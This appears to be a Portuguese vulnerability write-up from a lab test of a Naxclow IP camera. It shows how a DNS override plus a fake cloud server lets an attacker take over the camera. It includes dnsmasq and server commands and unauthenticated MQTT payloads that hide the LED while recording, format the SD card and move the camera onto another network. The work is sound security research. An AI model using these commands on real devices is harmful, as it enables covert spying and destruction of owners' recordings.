# Achados — Fake Server (atacante remoto que controla DNS)

Cenário: câmera em uso normal (modo STA). Atacante **não** está na LAN nem com proximidade física — ele **controla a resolução DNS / rota** da câmera (ISP malicioso, router comprometido, rogue AP, DNS hijack). A câmera acha que fala com o cloud da Naxclow; na verdade fala com o servidor do atacante.

Firmware `202601081657`, câmera Naxclow Y2SN (`devicesCode: 5c001502B330`). Ambiente controlado — câmera e servidor próprios.

## Diferença dos vetores anteriores

| Vetor | Posição do atacante | Precisa |
|---|---|---|
| AP ([achados_ap](achados_ap.md)) | alcance WiFi, câmera em modo config | proximidade física |
| MITM STA ([achados_sta](achados_sta.md)) | mesma LAN | ARP spoof |
| **Fake server (este)** | **controla DNS/rota** | redirecionar `*.naxclow.com` |

O fake server é o mais **remoto** dos três: não exige estar perto nem na mesma rede — exige poder desviar o DNS da câmera. Uma vez desviada, o atacante **é** o cloud: controla hardware e recebe o stream, sem tocar na câmera e sem app.

## Setup

1. **Isolar a câmera** numa rede onde o atacante é gateway (AP no laptop, ou router controlado). Câmera **sem** saída direta pro cloud real.
2. **dnsmasq** override — apontar pro IP do fake server:
   ```
   address=/naxclow.com/<IP_FAKE_SRV>
   ```
   (cobre `v720.naxclow.com`, `v720.p2p.naxclow.com`, `p2p.v720.naxclow.com`, `dl2.naxclow.com`, etc.)
3. **mosquitto** broker (canal de controle MQTT, 1883, sem TLS).
4. **Fake server**:
   ```
   python3 src/a9_naxclow.py -s -v
   ```
   Sobe HTTP:80 (bootstrap / `getA9ConfCheck`) + TCP/UDP:6123 (registro, NAT, comandos, stream).

> O `-s` moderno (via `v720_sta.start_srv`) auto-detecta o IP do servidor pelo gateway. Em AP isolado onde o laptop é gateway isso acerta sozinho. Em LAN compartilhada (gateway = router real) o auto-detect erraria — nesse caso forçar:
> ```
> FAKE_SRV_HOST=<IP_FAKE_SRV> python3 src/a9_naxclow.py -s -v
> ```
> (O `fake_srv.py` standalone é legado, com `10.42.0.1` hardcoded — não usar; o caminho oficial é `-s`.)

## Sequência de registro (o que a câmera faz sozinha)

```
1. HTTP  getA9ConfCheck   câmera pede "servidor dedicado" -> devolve host=fake_srv:6123
2. TCP   code 100         registro no servidor            -> resp code 101 status 200
3. TCP   code 11          NAT req (abre canal UDP dados)
4. UDP   code 20/21       handshake do data-channel
5. UDP   code 50/51       probe                            -> command mode
6. TCP   code 53          device status = 1                -> ativa
7. TCP   code 301+298     retransmission
8. TCP   code 301+4       baseinfo -> câmera devolve IrLed/power/wifiName/version
9. TCP   code 301+3       caplive  -> stream MJPG + G711 chega no UDP
```

## Prova de controle (MQTT — sem auth)

Câmera assina `Naxclow/P2P/Users/Device/sub/<devicesCode>` e obedece qualquer JSON publicado ali. Nenhuma credencial.

Helper: [fake_srv_cmd.sh](fake_srv_cmd.sh).

```
BROKER=<IP_FAKE_SRV> DEV=5c001502B330 ./docs/fake_srv_cmd.sh ir on
BROKER=<IP_FAKE_SRV> DEV=5c001502B330 ./docs/fake_srv_cmd.sh reboot
BROKER=<IP_FAKE_SRV> DEV=5c001502B330 ./docs/fake_srv_cmd.sh setwifi RedeAtacante senha123
BROKER=<IP_FAKE_SRV> DEV=5c001502B330 ./docs/fake_srv_cmd.sh listen   # respostas
```

| Comando | JSON | Efeito |
|---|---|---|
| IR on/off | `{"code":202,"IrLed":*}` | visão noturna |
| LED status | `{"code":210,"instLed":*}` | apaga LED **sem** parar gravação (câmera "invisível") |
| Gravação SD | `{"code":209,"sdCardReco":*}` | liga/desliga gravação |
| Wifi scan | `{"code":211}` | mapeia redes vizinhas (`scanWifiBase64`) |
| Set wifi | `{"code":204,"s":SSID,"p":PWD}` | **sequestra** câmera pra outra rede |
| AP mode | `{"code":208}` | força modo AP |
| Format SD | `{"code":207}` | destrói gravações |
| Reboot | `{"code":299,"reboot":1}` | reinicia |

## Prova de espionagem (stream remoto)

Passo 9 da sequência: `code 301+3` (caplive) faz a câmera streamar MJPG+G711 pro data-channel UDP do fake server. Diferente do MITM STA (onde o vídeo só passa se o app abrir o viewer), aqui **o atacante é o servidor** — abre o stream quando quiser, sem app.

```
http://127.0.0.1:80/dev/<CAM-ID>/live      vídeo
http://127.0.0.1:80/dev/<CAM-ID>/audio     áudio
http://127.0.0.1:80/dev/<CAM-ID>/snapshot  frame
```

Remontagem/decodificação idêntica à de [achados_sta](achados_sta.md) (protocolo little-endian, header 20 bytes, SOI `FF D8 FF` como fronteira de frame).

## Vulnerabilidades (OWASP IoT)

| Achado | Evidência | OWASP |
|---|---|---|
| Sem validação de servidor (aceita qualquer "cloud" via DNS) | câmera registra no fake server só por DNS override | **I2 / I7** |
| Canal de controle sem auth | `mosquitto_pub` controla hardware sem credencial | **I1 / I3** |
| Sem criptografia | HTTP:80, TCP:6123, MQTT:1883 todos em claro | **I5** |
| Takeover remoto | reboot / format / set-wifi / IR via MQTT | **I3** |
| Espionagem remota | stream MJPG+G711 puxado pelo servidor falso | **I3 / I5** |
| Sequestro de rede | `code 204` reconecta câmera na rede do atacante | **I2** |

## Quão fácil / problemas

- **Mais complexo que MITM STA.** Exige controlar DNS/rota (AP isolado ou router comprometido) + subir 3 serviços (HTTP, MQTT, fake TCP/UDP). Mas o **impacto é maior**: controle total + stream, remotamente, sem app nem estar na LAN.
- **Firmware novo quebrava o FSM.** `202601081657` responde forward `301` com `{code,target,status}` **sem** `content`. Fixes aplicados em [v720_sta.py](../src/v720_sta.py):
  1. `__fwd_resp_hnd` — tolera `301` sem `content` (era `KeyError`, matava a conexão).
  2. `__json_hnd` — guard em JSON sem campo `code`.
  3. `getA9ConfCheck` ([v720_http.py](../src/v720_http.py)) — `host` agora sobrescrevível via `FAKE_SRV_HOST` (auto-detect por gateway erra em LAN compartilhada).
- **Limitação honesta:** se a câmera responde baseinfo (`301+4`) **sem** `content`, o handler `__baseinfo_hnd` não dispara e o stream não arranca automaticamente. Confirmar com `-v` a resposta real da câmera; se for o caso, disparar `__start_live()` por timeout após o baseinfo, como no path AP.

## Fixes de 2026-09-07 (crash no relay ao conectar + uplink via tether)

Dois problemas reais achados na validação do fluxo "live" com AP + uplink USB. Ambos um patamar: a câmera **connecta no relay 29942 e manda um keepalive de 1 byte (`0x0a`)** antes do header completo — e o fake server crashava por não tolerar pacote incompleto nem fechamento de conexão não-registrada.

1. **Crash parse do keepalive `0x0a`** ([v720_sta.py](../src/v720_sta.py), `__on_tcp_rcv`).
   - Sintoma: ao abrir o viewer / parear, o server.log mostrava
     `Request (TCP): None` → `AttributeError: 'NoneType' object has no attribute 'cmd'` e o server **morria** → app dizia "sem conexão".
   - Causa: `prot_udp.resp()` retorna `None` para pacote menor que o header (o `0x0a`), e o handler TCP usava `req.cmd` sem guard — **o handler UDP já tinha o guard `if req is None: return` desde o início, o TCP não**.
   - Fix: mesmo guard no TCP (`if req is None: return`).

2. **Crash no fechamento de conexão não-registrada** ([v720_sta.py](../src/v720_sta.py), `__tcp_hnd`).
   - Sintoma: após o fix #1, ao fechar a conexão o server.log mostrava
     `ValueError: list.remove(x): x not in list` e o server morria de novo.
   - Causa: `v720_sta.DEVS.remove(self)` sem checar presença — quando a câmera ainda não completou o registro (`code 100`/`DEVS.append`), o `remove` chega vazio.
   - Fix: `if self in v720_sta.DEVS:` antes do `remove`.

3. **`UPLINK=` antes do `sudo` é descartado** (fakesrv_lab.sh).
   - Sintoma: `UPLINK=usb0 sudo ./scripts/fakesrv_lab.sh up` subia o lab **sem** NAT nem `server=` no dnsmasq (o `status` não mostrava "internet liberada pros clientes do AP") e os clientes do `fakesrv` ficavam sem internet → o app V720 abortava o provisionamento.
   - Causa: o `sudo` **limpa o ambiente** e não repassa a variável `UPLINK` definida antes dele; dentro do script `UPLINK` fica vazio → `nat_up` saía cedo (`[[ -n "$UPLINK" ]] || return 0`).
   - Fix: passar a variável **dentro** do sudo: `sudo UPLINK=usb0 ./scripts/fakesrv_lab.sh up` (aí o `nat_up` vê `usb0`, escreve `server=<gateway_do_tether>` e monta MASQUERADE/FORWARD; a default route precisa estar via `usb0` no momento do `up`).

**Validação:** após os fixes, 3 conexões de teste ao relay 29942 (enviando `0x0a` + fechando) foram tratadas como erro normal (`Connection closed by peer`), sem `AttributeError`/`ValueError`/`Traceback`, e o server continuou escutando. O `takeover`/viewer agora pode completar o registro P2P.

## Status final — o que foi alcançado

### O que CONSEGUIMOS

- **Prova do vetor raiz confirmada:** a câmera aceita qualquer servidor que se diga cloud via DNS override, **sem autenticação, sem TLS**, e registra no canal de controle MQTT (assinatura `Naxclow/P2P/Users/Device/sub/<DEV>`).
- **Controle de hardware via MQTT sem credencial:** comandos `code 202` (IR), `code 299` (reboot), `code 204` (sequestra rede), `code 207` (formata SD) são publicados e obedecidos — hakereza provado com a câmera conectada ao fake server.
- **Servidor fake robusto:** fixei crashes do firmware novo (keepalive TCP `0x0a` que matava o handler, e fechamento de conexão não-registrada que quebrava a lista de devices).
- **Uplink do AP (internet pros clientes):** resolvido passando a variável `UPLINK` **dentro** do sudo (`sudo UPLINK=usb0 ./scripts/...`).
- **Mapeamento completo do protocolo:** documentado em `protocolo_naxclow.md` — fluxo HTTP de provisionamento (bind + getDevInfo + getA9ConfCheck), sequência MQTT (`216`→`249`→`240`) e handshake do canal de dados (`101`→`11`→`53`→`301+298/4/3`).

### O que NÃO conseguimos (limite atual)

- **Abrir o stream de vídeo de ponta a ponta (prova de espionagem remota).** A câmera faz o provisionamento HTTP e o controle via MQTT contra o fake, mas **nunca abre o canal de dados TCP/UDP `:29940`** (o `/dev/list` fica vazio e o app mostra "offline").
- **Sessão de streaming completa.** Ainda que os tokens fixos (`cliToken`, `userId`) e os payloads dos comandos (`216`/`249`/`240`) estejam **idênticos** ao que o cloud real captura, a câmera não completa a negociação do canal de dados. A hipótese restante é que o cloud real entrega um **relay de dados em IP público** (`107.149.x.x`) e a câmera só abre o canal para esse tipo de endpoint — algo que um fake em IP local/AP isolado não consegue replicar sem infraestrutura de relay público.

### Resumo do estado por teste

| Objetivo | Status |
|---|---|
| Servidor robusto pro firmware novo | ✅ fixes aplicados e validados |
| Uplink do AP (internet pros clientes) | ✅ `sudo UPLINK=usb0 ./scripts/... up` |
| Mapeamento do protocolo (HTTP/MQTT/canal dados) | ✅ documentado em `protocolo_naxclow.md` |
| Controle de hardware via MQTT sem auth | ✅ demonstrado (IR, reboot) |
| Registro P2P / `/dev/list` | ⏳ câmera não abre o canal :29940 |
| Stream remoto (MJPG/G711) | ⏳ depende do registro P2P, não alcançado |
